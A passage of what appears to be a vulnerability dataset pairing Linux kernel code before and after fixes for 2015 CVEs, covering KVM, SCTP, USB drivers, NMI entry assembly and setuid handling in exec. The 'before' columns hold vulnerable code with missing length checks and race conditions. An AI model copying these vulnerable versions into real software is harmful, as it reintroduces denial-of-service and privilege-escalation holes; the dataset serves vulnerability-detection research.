	    (KVM_GUESTDBG_ENABLE | KVM_GUESTDBG_USE_SW_BP))
 return handle_rmode_exception(vcpu, ex_no, error_code);

 switch (ex_no) {



 case DB_VECTOR:
		dr6 = vmcs_readl(EXIT_QUALIFICATION);
 if (!(vcpu->guest_debug &
","	{ SVM_EXIT_EXCP_BASE + UD_VECTOR,       ""UD excp"" }, \
	{ SVM_EXIT_EXCP_BASE + PF_VECTOR,       ""PF excp"" }, \
	{ SVM_EXIT_EXCP_BASE + NM_VECTOR,       ""NM excp"" }, \
	{ SVM_EXIT_EXCP_BASE + AC_VECTOR,       ""AC excp"" }, \
	{ SVM_EXIT_EXCP_BASE + MC_VECTOR,       ""MC excp"" }, \
	{ SVM_EXIT_INTR,        ""interrupt"" }, \
	{ SVM_EXIT_NMI,         ""nmi"" }, \
 set_exception_intercept(svm, PF_VECTOR);
 set_exception_intercept(svm, UD_VECTOR);
 set_exception_intercept(svm, MC_VECTOR);
 set_exception_intercept(svm, AC_VECTOR);

 set_intercept(svm, INTERCEPT_INTR);
 set_intercept(svm, INTERCEPT_NMI);
 return 1;
}

static int ac_interception(struct vcpu_svm *svm)
{
 kvm_queue_exception_e(&svm->vcpu, AC_VECTOR, 0);
 return 1;
}

static void svm_fpu_activate(struct kvm_vcpu *vcpu)
{
 struct vcpu_svm *svm = to_svm(vcpu);
	[SVM_EXIT_EXCP_BASE + PF_VECTOR]	= pf_interception,
	[SVM_EXIT_EXCP_BASE + NM_VECTOR]	= nm_interception,
	[SVM_EXIT_EXCP_BASE + MC_VECTOR]	= mc_interception,
	[SVM_EXIT_EXCP_BASE + AC_VECTOR]	= ac_interception,
	[SVM_EXIT_INTR]				= intr_interception,
	[SVM_EXIT_NMI]				= nmi_interception,
	[SVM_EXIT_SMI]				= nop_on_interception,
	u32 eb;

	eb = (1u << PF_VECTOR) | (1u << UD_VECTOR) | (1u << MC_VECTOR) |
	     (1u << NM_VECTOR) | (1u << DB_VECTOR) | (1u << AC_VECTOR);
 if ((vcpu->guest_debug &
	     (KVM_GUESTDBG_ENABLE | KVM_GUESTDBG_USE_SW_BP)) ==
	    (KVM_GUESTDBG_ENABLE | KVM_GUESTDBG_USE_SW_BP))
 return handle_rmode_exception(vcpu, ex_no, error_code);

 switch (ex_no) {
 case AC_VECTOR:
 kvm_queue_exception_e(vcpu, AC_VECTOR, error_code);
 return 1;
 case DB_VECTOR:
		dr6 = vmcs_readl(EXIT_QUALIFICATION);
 if (!(vcpu->guest_debug &
"
2015,DoS Overflow Mem. Corr. ,CVE-2015-5283," unregister_inetaddr_notifier(&sctp_inetaddr_notifier);
}

static int __net_init sctp_net_init(struct net *net)
{
 int status;


 sctp_dbg_objcnt_init(net);

 /* Initialize the control inode/socket for handling OOTB packets.  */
 if ((status = sctp_ctl_sock_init(net))) {
 pr_err(""Failed to initialize the SCTP control sock\n"");
 goto err_ctl_sock_init;
	}

 /* Initialize the local address list. */
 INIT_LIST_HEAD(&net->sctp.local_addr_list);
 spin_lock_init(&net->sctp.local_addr_lock);

 return 0;

err_ctl_sock_init:
 sctp_dbg_objcnt_exit(net);
 sctp_proc_exit(net);
err_init_proc:
 cleanup_sctp_mibs(net);
err_init_mibs:
 return status;
}

static void __net_exit sctp_net_exit(struct net *net)
{
 /* Free the local address list */
 sctp_free_addr_wq(net);
 sctp_free_local_addr_list(net);

 /* Free the control endpoint.  */
 inet_ctl_sock_destroy(net->sctp.ctl_sock);

 sctp_dbg_objcnt_exit(net);

 sctp_proc_exit(net);
 cleanup_sctp_mibs(net);
 sctp_sysctl_net_unregister(net);
}

static struct pernet_operations sctp_net_ops = {
	.init = sctp_net_init,
	.exit = sctp_net_exit,























};

/* Initialize the universe into something sensible.  */
 sctp_v4_pf_init();
 sctp_v6_pf_init();

	status = sctp_v4_protosw_init();




 if (status)
 goto err_protosw_init;

	status = sctp_v6_protosw_init();
 if (status)
 goto err_v6_protosw_init;

	status = register_pernet_subsys(&sctp_net_ops);
 if (status)
 goto err_register_pernet_subsys;

	status = sctp_v4_add_protocol();
 if (status)
err_v6_add_protocol:
 sctp_v4_del_protocol();
err_add_protocol:
 unregister_pernet_subsys(&sctp_net_ops);
err_register_pernet_subsys:
 sctp_v6_protosw_exit();
err_v6_protosw_init:
 sctp_v4_protosw_exit();
err_protosw_init:


 sctp_v4_pf_exit();
 sctp_v6_pf_exit();
 sctp_sysctl_unregister();
 sctp_v6_del_protocol();
 sctp_v4_del_protocol();

 unregister_pernet_subsys(&sctp_net_ops);

 /* Free protosw registrations */
 sctp_v6_protosw_exit();
 sctp_v4_protosw_exit();



 /* Unregister with socket layer. */
 sctp_v6_pf_exit();
 sctp_v4_pf_exit();
"," unregister_inetaddr_notifier(&sctp_inetaddr_notifier);
}

static int __net_init sctp_defaults_init(struct net *net)
{
 int status;


 sctp_dbg_objcnt_init(net);







 /* Initialize the local address list. */
 INIT_LIST_HEAD(&net->sctp.local_addr_list);
 spin_lock_init(&net->sctp.local_addr_lock);

 return 0;




err_init_proc:
 cleanup_sctp_mibs(net);
err_init_mibs:
 return status;
}

static void __net_exit sctp_defaults_exit(struct net *net)
{
 /* Free the local address list */
 sctp_free_addr_wq(net);
 sctp_free_local_addr_list(net);




 sctp_dbg_objcnt_exit(net);

 sctp_proc_exit(net);
 cleanup_sctp_mibs(net);
 sctp_sysctl_net_unregister(net);
}

static struct pernet_operations sctp_defaults_ops = {
	.init = sctp_defaults_init,
	.exit = sctp_defaults_exit,
};

static int __net_init sctp_ctrlsock_init(struct net *net)
{
 int status;

 /* Initialize the control inode/socket for handling OOTB packets.  */
	status = sctp_ctl_sock_init(net);
 if (status)
 pr_err(""Failed to initialize the SCTP control sock\n"");

 return status;
}

static void __net_init sctp_ctrlsock_exit(struct net *net)
{
 /* Free the control endpoint.  */
 inet_ctl_sock_destroy(net->sctp.ctl_sock);
}

static struct pernet_operations sctp_ctrlsock_ops = {
	.init = sctp_ctrlsock_init,
	.exit = sctp_ctrlsock_exit,
};

/* Initialize the universe into something sensible.  */
 sctp_v4_pf_init();
 sctp_v6_pf_init();

	status = register_pernet_subsys(&sctp_defaults_ops);
 if (status)
 goto err_register_defaults;

	status = sctp_v4_protosw_init();
 if (status)
 goto err_protosw_init;

	status = sctp_v6_protosw_init();
 if (status)
 goto err_v6_protosw_init;

	status = register_pernet_subsys(&sctp_ctrlsock_ops);
 if (status)
 goto err_register_ctrlsock;

	status = sctp_v4_add_protocol();
 if (status)
err_v6_add_protocol:
 sctp_v4_del_protocol();
err_add_protocol:
 unregister_pernet_subsys(&sctp_ctrlsock_ops);
err_register_ctrlsock:
 sctp_v6_protosw_exit();
err_v6_protosw_init:
 sctp_v4_protosw_exit();
err_protosw_init:
 unregister_pernet_subsys(&sctp_defaults_ops);
err_register_defaults:
 sctp_v4_pf_exit();
 sctp_v6_pf_exit();
 sctp_sysctl_unregister();
 sctp_v6_del_protocol();
 sctp_v4_del_protocol();

 unregister_pernet_subsys(&sctp_ctrlsock_ops);

 /* Free protosw registrations */
 sctp_v6_protosw_exit();
 sctp_v4_protosw_exit();

 unregister_pernet_subsys(&sctp_defaults_ops);

 /* Unregister with socket layer. */
 sctp_v6_pf_exit();
 sctp_v4_pf_exit();
"
2015,DoS ,CVE-2015-5257,"static int whiteheat_firmware_attach(struct usb_serial *serial);

/* function prototypes for the Connect Tech WhiteHEAT serial converter */


static int whiteheat_attach(struct usb_serial *serial);
static void whiteheat_release(struct usb_serial *serial);
static int whiteheat_port_probe(struct usb_serial_port *port);
	.description =		""Connect Tech - WhiteHEAT"",
	.id_table =		id_table_std,
	.num_ports =		4,

	.attach =		whiteheat_attach,
	.release =		whiteheat_release,
	.port_probe =		whiteheat_port_probe,
/*****************************************************************************
 * Connect Tech's White Heat serial driver functions
 *****************************************************************************/




























static int whiteheat_attach(struct usb_serial *serial)
{
 struct usb_serial_port *command_port;
","static int whiteheat_firmware_attach(struct usb_serial *serial);

/* function prototypes for the Connect Tech WhiteHEAT serial converter */
static int whiteheat_probe(struct usb_serial *serial,
 const struct usb_device_id *id);
static int whiteheat_attach(struct usb_serial *serial);
static void whiteheat_release(struct usb_serial *serial);
static int whiteheat_port_probe(struct usb_serial_port *port);
	.description =		""Connect Tech - WhiteHEAT"",
	.id_table =		id_table_std,
	.num_ports =		4,
	.probe =		whiteheat_probe,
	.attach =		whiteheat_attach,
	.release =		whiteheat_release,
	.port_probe =		whiteheat_port_probe,
/*****************************************************************************
 * Connect Tech's White Heat serial driver functions
 *****************************************************************************/

static int whiteheat_probe(struct usb_serial *serial,
 const struct usb_device_id *id)
{
 struct usb_host_interface *iface_desc;
 struct usb_endpoint_descriptor *endpoint;
 size_t num_bulk_in = 0;
 size_t num_bulk_out = 0;
 size_t min_num_bulk;
 unsigned int i;

	iface_desc = serial->interface->cur_altsetting;

 for (i = 0; i < iface_desc->desc.bNumEndpoints; i++) {
		endpoint = &iface_desc->endpoint[i].desc;
 if (usb_endpoint_is_bulk_in(endpoint))
			++num_bulk_in;
 if (usb_endpoint_is_bulk_out(endpoint))
			++num_bulk_out;
	}

	min_num_bulk = COMMAND_PORT + 1;
 if (num_bulk_in < min_num_bulk || num_bulk_out < min_num_bulk)
 return -ENODEV;

 return 0;
}

static int whiteheat_attach(struct usb_serial *serial)
{
 struct usb_serial_port *command_port;
"
2015,#NAME?,CVE-2015-5157,"	 * a nested NMI that updated the copy interrupt stack frame, a
	 * jump will be made to the repeat_nmi code that will handle the second
	 * NMI.





	 */

	/* Use %rdx as our temp variable throughout */
 pushq %rdx






































	/*
	 * If %cs was not the kernel segment, then the NMI triggered in user
	 * space, which means it is definitely not nested.

	 */
 cmpl	$__KERNEL_CS, 16(%rsp)
 jne	first_nmi














	/*
	 * Check the special variable on the stack to see if NMIs are
	 * executing.
","	 * a nested NMI that updated the copy interrupt stack frame, a
	 * jump will be made to the repeat_nmi code that will handle the second
	 * NMI.
	 *
	 * However, espfix prevents us from directly returning to userspace
	 * with a single IRET instruction.  Similarly, IRET to user mode
	 * can fault.  We therefore handle NMIs from user space like
	 * other IST entries.
	 */

	/* Use %rdx as our temp variable throughout */
 pushq %rdx

 testb $3, CS-RIP+8(%rsp)
 jz	.Lnmi_from_kernel

	/*
	 * NMI from user mode.  We need to run on the thread stack, but we
	 * can't go through the normal entry paths: NMIs are masked, and
	 * we don't want to enable interrupts, because then we'll end
	 * up in an awkward situation in which IRQs are on but NMIs
	 * are off.
	 */

 SWAPGS
 cld
 movq %rsp, %rdx
 movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp
 pushq	5*8(%rdx)	/* pt_regs->ss */
 pushq	4*8(%rdx)	/* pt_regs->rsp */
 pushq	3*8(%rdx)	/* pt_regs->flags */
 pushq	2*8(%rdx)	/* pt_regs->cs */
 pushq	1*8(%rdx)	/* pt_regs->rip */
 pushq $-1		/* pt_regs->orig_ax */
 pushq %rdi		/* pt_regs->di */
 pushq %rsi		/* pt_regs->si */
 pushq   (%rdx)		/* pt_regs->dx */
 pushq %rcx		/* pt_regs->cx */
 pushq %rax		/* pt_regs->ax */
 pushq %r8		/* pt_regs->r8 */
 pushq %r9		/* pt_regs->r9 */
 pushq %r10		/* pt_regs->r10 */
 pushq %r11		/* pt_regs->r11 */
 pushq %rbx		/* pt_regs->rbx */
 pushq %rbp		/* pt_regs->rbp */
 pushq %r12		/* pt_regs->r12 */
 pushq %r13		/* pt_regs->r13 */
 pushq %r14		/* pt_regs->r14 */
 pushq %r15		/* pt_regs->r15 */

	/*
	 * At this point we no longer need to worry about stack damage
	 * due to nesting -- we're on the normal thread stack and we're
	 * done with the NMI stack.
	 */



 movq %rsp, %rdi
 movq $-1, %rsi
 call	do_nmi

	/*
	 * Return back to user mode.  We must *not* do the normal exit
	 * work, because we don't want to enable interrupts.  Fortunately,
	 * do_nmi doesn't modify pt_regs.
	 */
 SWAPGS
 jmp	restore_c_regs_and_iret

.Lnmi_from_kernel:
	/*
	 * Check the special variable on the stack to see if NMIs are
	 * executing.
"
2015,DoS Overflow Mem. Corr. ,CVE-2015-5156," /* Do we support ""hardware"" checksums? */
 if (virtio_has_feature(vdev, VIRTIO_NET_F_CSUM)) {
 /* This opens up the world of extra features. */
		dev->hw_features |= NETIF_F_HW_CSUM|NETIF_F_SG|NETIF_F_FRAGLIST;
 if (csum)
			dev->features |= NETIF_F_HW_CSUM|NETIF_F_SG|NETIF_F_FRAGLIST;

 if (virtio_has_feature(vdev, VIRTIO_NET_F_GSO)) {
			dev->hw_features |= NETIF_F_TSO | NETIF_F_UFO
"," /* Do we support ""hardware"" checksums? */
 if (virtio_has_feature(vdev, VIRTIO_NET_F_CSUM)) {
 /* This opens up the world of extra features. */
		dev->hw_features |= NETIF_F_HW_CSUM | NETIF_F_SG;
 if (csum)
			dev->features |= NETIF_F_HW_CSUM | NETIF_F_SG;

 if (virtio_has_feature(vdev, VIRTIO_NET_F_GSO)) {
			dev->hw_features |= NETIF_F_TSO | NETIF_F_UFO
"
2015,DoS ,CVE-2015-4700,"	}
	ctx.cleanup_addr = proglen;

 for (pass = 0; pass < 10; pass++) {





		proglen = do_jit(prog, addrs, image, oldproglen, &ctx);
 if (proglen <= 0) {
			image = NULL;
","	}
	ctx.cleanup_addr = proglen;

 /* JITed image shrinks with every pass and the loop iterates
	 * until the image stops shrinking. Very large bpf programs
	 * may converge on the last pass. In such case do one more
	 * pass to emit the final image
 */
 for (pass = 0; pass < 10 || image; pass++) {
		proglen = do_jit(prog, addrs, image, oldproglen, &ctx);
 if (proglen <= 0) {
			image = NULL;
"
2015,DoS ,CVE-2015-4692,"
static inline bool kvm_apic_has_events(struct kvm_vcpu *vcpu)
{
 return vcpu->arch.apic->pending_events;
}

static inline bool kvm_lowest_prio_delivery(struct kvm_lapic_irq *irq)
","
static inline bool kvm_apic_has_events(struct kvm_vcpu *vcpu)
{
 return kvm_vcpu_has_lapic(vcpu) && vcpu->arch.apic->pending_events;
}

static inline bool kvm_lowest_prio_delivery(struct kvm_lapic_irq *irq)
"
2016,DoS ,CVE-2015-4178,"void pin_remove(struct fs_pin *pin)
{
 spin_lock(&pin_lock);
 hlist_del(&pin->m_list);
 hlist_del(&pin->s_list);
 spin_unlock(&pin_lock);
 spin_lock_irq(&pin->wait.lock);
	pin->done = 1;
static inline void init_fs_pin(struct fs_pin *p, void (*kill)(struct fs_pin *))
{
 init_waitqueue_head(&p->wait);


	p->kill = kill;
}

","void pin_remove(struct fs_pin *pin)
{
 spin_lock(&pin_lock);
 hlist_del_init(&pin->m_list);
 hlist_del_init(&pin->s_list);
 spin_unlock(&pin_lock);
 spin_lock_irq(&pin->wait.lock);
	pin->done = 1;
static inline void init_fs_pin(struct fs_pin *p, void (*kill)(struct fs_pin *))
{
 init_waitqueue_head(&p->wait);
 INIT_HLIST_NODE(&p->s_list);
 INIT_HLIST_NODE(&p->m_list);
	p->kill = kill;
}

"
2016,DoS ,CVE-2015-4177,"{
 struct mount *tree;
 namespace_lock();
	tree = copy_tree(real_mount(path->mnt), path->dentry,
			 CL_COPY_ALL | CL_PRIVATE);



 namespace_unlock();
 if (IS_ERR(tree))
 return ERR_CAST(tree);
","{
 struct mount *tree;
 namespace_lock();
 if (!check_mnt(real_mount(path->mnt)))
		tree = ERR_PTR(-EINVAL);
 else
		tree = copy_tree(real_mount(path->mnt), path->dentry,
				 CL_COPY_ALL | CL_PRIVATE);
 namespace_unlock();
 if (IS_ERR(tree))
 return ERR_CAST(tree);
"
2016,#NAME?,CVE-2015-4176,"enum umount_tree_flags {
	UMOUNT_SYNC = 1,
	UMOUNT_PROPAGATE = 2,

};
/*
 * mount_lock must be held
 if (how & UMOUNT_SYNC)
			p->mnt.mnt_flags |= MNT_SYNC_UMOUNT;

		disconnect = !IS_MNT_LOCKED_AND_LAZY(p);




 pin_insert_group(&p->mnt_umount, &p->mnt_parent->mnt,
				 disconnect ? &unmounted : NULL);
 umount_mnt(p);
			}
		}
 else umount_tree(mnt, 0);
	}
 unlock_mount_hash();
 put_mountpoint(mp);
","enum umount_tree_flags {
	UMOUNT_SYNC = 1,
	UMOUNT_PROPAGATE = 2,
	UMOUNT_CONNECTED = 4,
};
/*
 * mount_lock must be held
 if (how & UMOUNT_SYNC)
			p->mnt.mnt_flags |= MNT_SYNC_UMOUNT;

		disconnect = !(((how & UMOUNT_CONNECTED) &&
 mnt_has_parent(p) &&
				(p->mnt_parent->mnt.mnt_flags & MNT_UMOUNT)) ||
 IS_MNT_LOCKED_AND_LAZY(p));

 pin_insert_group(&p->mnt_umount, &p->mnt_parent->mnt,
				 disconnect ? &unmounted : NULL);
 umount_mnt(p);
			}
		}
 else umount_tree(mnt, UMOUNT_CONNECTED);
	}
 unlock_mount_hash();
 put_mountpoint(mp);
"
2016,DoS ,CVE-2015-4170," return atomic_long_add_return(delta, (atomic_long_t *)&sem->count);
}






static inline int ldsem_cmpxchg(long *old, long new, struct ld_semaphore *sem)
{
 long tmp = *old;
	*old = atomic_long_cmpxchg(&sem->count, *old, new);
 return *old == tmp;





}

/*
"," return atomic_long_add_return(delta, (atomic_long_t *)&sem->count);
}

/*
 * ldsem_cmpxchg() updates @*old with the last-known sem->count value.
 * Returns 1 if count was successfully changed; @*old will have @new value.
 * Returns 0 if count was not changed; @*old will have most recent sem->count
 */
static inline int ldsem_cmpxchg(long *old, long new, struct ld_semaphore *sem)
{
 long tmp = atomic_long_cmpxchg(&sem->count, *old, new);
 if (tmp == *old) {
		*old = new;
 return 1;
	} else {
		*old = tmp;
 return 0;
	}
}

/*
"
2015,DoS Overflow ,CVE-2015-4167,"	}
	inode->i_generation = iinfo->i_unique;










 /* Sanity checks for files in ICB so that we don't get confused later */
 if (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {
 /*
","	}
	inode->i_generation = iinfo->i_unique;

 /*
	 * Sanity check length of allocation descriptors and extended attrs to
	 * avoid integer overflows
 */
 if (iinfo->i_lenEAttr > bs || iinfo->i_lenAlloc > bs)
 goto out;
 /* Now do exact checks */
 if (udf_file_entry_alloc_offset(inode) + iinfo->i_lenAlloc > bs)
 goto out;
 /* Sanity checks for files in ICB so that we don't get confused later */
 if (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {
 /*
"
2015,DoS Overflow Mem. Corr. ,CVE-2015-4036,"		 * lun[4-7] need to be zero according to virtio-scsi spec.
 */
		evt->event.lun[0] = 0x01;
		evt->event.lun[1] = tpg->tport_tpgt & 0xFF;
 if (lun->unpacked_lun >= 256)
			evt->event.lun[2] = lun->unpacked_lun >> 8 | 0x40 ;
		evt->event.lun[3] = lun->unpacked_lun & 0xFF;
 struct vhost_scsi_tport, tport_wwn);

 struct vhost_scsi_tpg *tpg;
 unsigned long tpgt;
 int ret;

 if (strstr(name, ""tpgt_"") != name)
 return ERR_PTR(-EINVAL);
 if (kstrtoul(name + 5, 10, &tpgt) || tpgt > UINT_MAX)
 return ERR_PTR(-EINVAL);

	tpg = kzalloc(sizeof(struct vhost_scsi_tpg), GFP_KERNEL);
","		 * lun[4-7] need to be zero according to virtio-scsi spec.
 */
		evt->event.lun[0] = 0x01;
		evt->event.lun[1] = tpg->tport_tpgt;
 if (lun->unpacked_lun >= 256)
			evt->event.lun[2] = lun->unpacked_lun >> 8 | 0x40 ;
		evt->event.lun[3] = lun->unpacked_lun & 0xFF;
 struct vhost_scsi_tport, tport_wwn);

 struct vhost_scsi_tpg *tpg;
 u16 tpgt;
 int ret;

 if (strstr(name, ""tpgt_"") != name)
 return ERR_PTR(-EINVAL);
 if (kstrtou16(name + 5, 10, &tpgt) || tpgt >= VHOST_SCSI_MAX_TARGET)
 return ERR_PTR(-EINVAL);

	tpg = kzalloc(sizeof(struct vhost_scsi_tpg), GFP_KERNEL);
"
2015,DoS Overflow +Info ,CVE-2015-4004,,
2015,DoS ,CVE-2015-4003," struct oz_multiple_fixed *body =
				(struct oz_multiple_fixed *)data_hdr;
			u8 *data = body->data;
 int n = (len - sizeof(struct oz_multiple_fixed)+1)



				/ body->unit_size;
 while (n--) {
 oz_hcd_data_ind(usb_ctx->hport, body->endpoint,
"," struct oz_multiple_fixed *body =
				(struct oz_multiple_fixed *)data_hdr;
			u8 *data = body->data;
 int n;
 if (!body->unit_size)
 break;
			n = (len - sizeof(struct oz_multiple_fixed)+1)
				/ body->unit_size;
 while (n--) {
 oz_hcd_data_ind(usb_ctx->hport, body->endpoint,
"
2015,DoS Exec Code Overflow ,CVE-2015-4002," case OZ_GET_DESC_RSP: {
 struct oz_get_desc_rsp *body =
				(struct oz_get_desc_rsp *)usb_hdr;
 int data_len = elt->length -
 sizeof(struct oz_get_desc_rsp) + 1;
			u16 offs = le16_to_cpu(get_unaligned(&body->offset));
			u16 total_size =





 le16_to_cpu(get_unaligned(&body->total_size));
 oz_dbg(ON, ""USB_REQ_GET_DESCRIPTOR - cnf\n"");
 oz_hcd_get_desc_cnf(usb_ctx->hport, body->req_id,
"," case OZ_GET_DESC_RSP: {
 struct oz_get_desc_rsp *body =
				(struct oz_get_desc_rsp *)usb_hdr;
			u16 offs, total_size;
			u8 data_len;

 if (elt->length < sizeof(struct oz_get_desc_rsp) - 1)
 break;
			data_len = elt->length -
					(sizeof(struct oz_get_desc_rsp) - 1);
			offs = le16_to_cpu(get_unaligned(&body->offset));
			total_size =
 le16_to_cpu(get_unaligned(&body->total_size));
 oz_dbg(ON, ""USB_REQ_GET_DESCRIPTOR - cnf\n"");
 oz_hcd_get_desc_cnf(usb_ctx->hport, body->req_id,
"
2015,DoS Exec Code ,CVE-2015-4001,"/*
 * Context: softirq
 */
void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
 int length, int offset, int total_size)
{
 struct oz_port *port = hport;
 struct urb *urb;
 if (!urb)
 return;
 if (status == 0) {
 int copy_len;
 int required_size = urb->transfer_buffer_length;

 if (required_size > total_size)
			required_size = total_size;

/* Confirmation functions.
 */
void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,
 const u8 *desc, int length, int offset, int total_size);
void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
 const u8 *data, int data_len);

","/*
 * Context: softirq
 */
void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,
 u8 length, u16 offset, u16 total_size)
{
 struct oz_port *port = hport;
 struct urb *urb;
 if (!urb)
 return;
 if (status == 0) {
 unsigned int copy_len;
 unsigned int required_size = urb->transfer_buffer_length;

 if (required_size > total_size)
			required_size = total_size;

/* Confirmation functions.
 */
void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,
 const u8 *desc, u8 length, u16 offset, u16 total_size);
void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
 const u8 *data, int data_len);

"
2015,DoS +Priv ,CVE-2015-3636," if (sk_hashed(sk)) {
 write_lock_bh(&ping_table.lock);
 hlist_nulls_del(&sk->sk_nulls_node);

 sock_put(sk);
		isk->inet_num = 0;
		isk->inet_sport = 0;
"," if (sk_hashed(sk)) {
 write_lock_bh(&ping_table.lock);
 hlist_nulls_del(&sk->sk_nulls_node);
 sk_nulls_node_init(&sk->sk_nulls_node);
 sock_put(sk);
		isk->inet_num = 0;
		isk->inet_sport = 0;
"
2015,#NAME?,CVE-2015-3339," spin_unlock(&p->fs->lock);
}
















































/*
 * Fill the binprm structure from the inode.
 * Check permissions, then read the first 128 (BINPRM_BUF_SIZE) bytes
 */
int prepare_binprm(struct linux_binprm *bprm)
{
 struct inode *inode = file_inode(bprm->file);
 umode_t mode = inode->i_mode;
 int retval;


 /* clear any previous set[ug]id data from a previous binary */
	bprm->cred->euid = current_euid();
	bprm->cred->egid = current_egid();

 if (!(bprm->file->f_path.mnt->mnt_flags & MNT_NOSUID) &&
	    !task_no_new_privs(current) &&
 kuid_has_mapping(bprm->cred->user_ns, inode->i_uid) &&
 kgid_has_mapping(bprm->cred->user_ns, inode->i_gid)) {
 /* Set-uid? */
 if (mode & S_ISUID) {
			bprm->per_clear |= PER_CLEAR_ON_SETID;
			bprm->cred->euid = inode->i_uid;
		}

 /* Set-gid? */
 /*
		 * If setgid is set but no group execute bit then this
		 * is a candidate for mandatory locking, not a setgid
		 * executable.
 */
 if ((mode & (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) {
			bprm->per_clear |= PER_CLEAR_ON_SETID;
			bprm->cred->egid = inode->i_gid;
		}
	}

 /* fill in binprm security blob */
	retval = security_bprm_set_creds(bprm);
"," spin_unlock(&p->fs->lock);
}

static void bprm_fill_uid(struct linux_binprm *bprm)
{
 struct inode *inode;
 unsigned int mode;
 kuid_t uid;
 kgid_t gid;

 /* clear any previous set[ug]id data from a previous binary */
	bprm->cred->euid = current_euid();
	bprm->cred->egid = current_egid();

 if (bprm->file->f_path.mnt->mnt_flags & MNT_NOSUID)
 return;

 if (task_no_new_privs(current))
 return;

	inode = file_inode(bprm->file);
	mode = READ_ONCE(inode->i_mode);
 if (!(mode & (S_ISUID|S_ISGID)))
 return;

 /* Be careful if suid/sgid is set */
 mutex_lock(&inode->i_mutex);

 /* reload atomically mode/uid/gid now that lock held */
	mode = inode->i_mode;
	uid = inode->i_uid;
	gid = inode->i_gid;
 mutex_unlock(&inode->i_mutex);

 /* We ignore suid/sgid if there are no mappings for them in the ns */
 if (!kuid_has_mapping(bprm->cred->user_ns, uid) ||
		 !kgid_has_mapping(bprm->cred->user_ns, gid))
 return;

 if (mode & S_ISUID) {
		bprm->per_clear |= PER_CLEAR_ON_SETID;
		bprm->cred->euid = uid;
	}

 if ((mode & (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) {
		bprm->per_clear |= PER_CLEAR_ON_SETID;
		bprm->cred->egid = gid;
	}
}

/*
 * Fill the binprm structure from the inode.
 * Check permissions, then read the first 128 (BINPRM_BUF_SIZE) bytes
 */
int prepare_binprm(struct linux_binprm *bprm)
{


 int retval;

 bprm_fill_uid(bprm);


























 /* fill in binprm security blob */
	retval = security_bprm_set_creds(bprm);
"
2015,DoS ,CVE-2015-3332,,
2015,DoS Exec Code Overflow ,CVE-2015-3331,"		src = kmalloc(req->cryptlen + req->assoclen, GFP_ATOMIC);
 if (!src)
 return -ENOMEM;
		assoc = (src + req->cryptlen + auth_tag_len);
 scatterwalk_map_and_copy(src, req->src, 0, req->cryptlen, 0);
 scatterwalk_map_and_copy(assoc, req->assoc, 0,
			req->assoclen, 0);
 scatterwalk_done(&src_sg_walk, 0, 0);
 scatterwalk_done(&assoc_sg_walk, 0, 0);
	} else {
 scatterwalk_map_and_copy(dst, req->dst, 0, req->cryptlen, 1);
 kfree(src);
	}
 return retval;
","		src = kmalloc(req->cryptlen + req->assoclen, GFP_ATOMIC);
 if (!src)
 return -ENOMEM;
		assoc = (src + req->cryptlen);
 scatterwalk_map_and_copy(src, req->src, 0, req->cryptlen, 0);
 scatterwalk_map_and_copy(assoc, req->assoc, 0,
			req->assoclen, 0);
 scatterwalk_done(&src_sg_walk, 0, 0);
 scatterwalk_done(&assoc_sg_walk, 0, 0);
	} else {
 scatterwalk_map_and_copy(dst, req->dst, 0, tempCipherLen, 1);
 kfree(src);
	}
 return retval;
"
2015,DoS ,CVE-2015-3291,"	/*
	 * Now test if the previous stack was an NMI stack.  This covers
	 * the case where we interrupt an outer NMI after it clears
	 * ""NMI executing"" but before IRET.







	 */
 lea	6*8(%rsp), %rdx
	/* Compare the NMI stack (rdx) with the stack we came from (4*8(%rsp)) */
 cmpq %rdx, 4*8(%rsp)
	/* If it is below the NMI stack, it is a normal NMI */
 jb	first_nmi
	/* Ah, it is within the NMI stack, treat it as nested */







nested_nmi:
	/*
	/* Point RSP at the ""iret"" frame. */
	REMOVE_PT_GPREGS_FROM_STACK 6*8

	/* Clear ""NMI executing"". */
 movq $0, 5*8(%rsp)









	/*
	 * INTERRUPT_RETURN reads the ""iret"" frame and exits the NMI
","	/*
	 * Now test if the previous stack was an NMI stack.  This covers
	 * the case where we interrupt an outer NMI after it clears
	 * ""NMI executing"" but before IRET.  We need to be careful, though:
	 * there is one case in which RSP could point to the NMI stack
	 * despite there being no NMI active: naughty userspace controls
	 * RSP at the very beginning of the SYSCALL targets.  We can
	 * pull a fast one on naughty userspace, though: we program
	 * SYSCALL to mask DF, so userspace cannot cause DF to be set
	 * if it controls the kernel's RSP.  We set DF before we clear
	 * ""NMI executing"".
	 */
 lea	6*8(%rsp), %rdx
	/* Compare the NMI stack (rdx) with the stack we came from (4*8(%rsp)) */
 cmpq %rdx, 4*8(%rsp)
	/* If it is below the NMI stack, it is a normal NMI */
 jb	first_nmi

	/* Ah, it is within the NMI stack. */

 testb	$(X86_EFLAGS_DF >> 8), (3*8 + 1)(%rsp)
 jz	first_nmi	/* RSP was user controlled. */

	/* This is a nested NMI. */

nested_nmi:
	/*
	/* Point RSP at the ""iret"" frame. */
	REMOVE_PT_GPREGS_FROM_STACK 6*8

	/*
	 * Clear ""NMI executing"".  Set DF first so that we can easily
	 * distinguish the remaining code between here and IRET from
	 * the SYSCALL entry and exit paths.  On a native kernel, we
	 * could just inspect RIP, but, on paravirt kernels,
	 * INTERRUPT_RETURN can translate into a jump into a
	 * hypercall page.
	 */
 std
 movq $0, 5*8(%rsp)		/* clear ""NMI executing"" */

	/*
	 * INTERRUPT_RETURN reads the ""iret"" frame and exits the NMI
"
2015,#NAME?,CVE-2015-3290,"	 * a nested NMI that updated the copy interrupt stack frame, a
	 * jump will be made to the repeat_nmi code that will handle the second
	 * NMI.





	 */

	/* Use %rdx as our temp variable throughout */
 pushq %rdx






































	/*
	 * If %cs was not the kernel segment, then the NMI triggered in user
	 * space, which means it is definitely not nested.

	 */
 cmpl	$__KERNEL_CS, 16(%rsp)
 jne	first_nmi














	/*
